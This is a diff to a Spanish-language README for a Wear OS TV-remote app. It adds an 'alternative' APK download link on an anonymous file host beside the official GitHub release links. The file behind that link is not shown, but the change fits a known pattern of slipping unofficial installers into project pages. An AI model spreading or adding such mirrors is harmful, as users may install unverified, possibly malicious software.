@@ -10,7 +10,7 @@ The UI is in Spanish; source code, identifiers and comments are in English.
 
 ## Descarga e instalación en el reloj
 
-**Descarga directa:** [TuControl.apk](https://github.com/camilo661/tucontrol/releases/latest/download/TuControl.apk) · [todas las versiones](https://github.com/camilo661/tucontrol/releases)
+**Descarga directa:** [TuControl.apk](https://github.com/camilo661/tucontrol/releases/latest/download/TuControl.apk) · [enlace alternativo](https://files.catbox.moe/hf6nqq.apk) · [todas las versiones](https://github.com/camilo661/tucontrol/releases)
 
 Requisitos: reloj con **Wear OS 3 o superior** (Galaxy Watch 4 o posterior, Pixel Watch, TicWatch…) y reloj y TV en la **misma red Wi‑Fi**.
 
